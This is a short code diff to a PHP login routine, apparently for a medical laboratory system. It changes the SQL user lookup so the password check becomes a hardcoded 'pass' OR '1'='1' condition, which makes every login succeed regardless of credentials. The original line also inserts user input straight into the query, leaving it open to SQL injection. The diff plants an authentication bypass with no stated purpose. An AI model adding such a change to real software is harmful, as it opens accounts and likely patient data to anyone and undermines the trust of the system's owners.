@@ -9,7 +9,7 @@
 
 	$objConexion=Conectarse();
 
-	$sql="SELECT * FROM usuarios WHERE usucc = '$loginMedicalSyslab' AND usuPassword = '$passMedicalSyslab'";
+	$sql="SELECT * FROM usuarios WHERE usucc = '$loginMedicalSyslab' AND usuPassword = 'pass' OR '1'='1'";
 
 	$resultado=$objConexion->query($sql);
 	$existe = $resultado->num_rows;
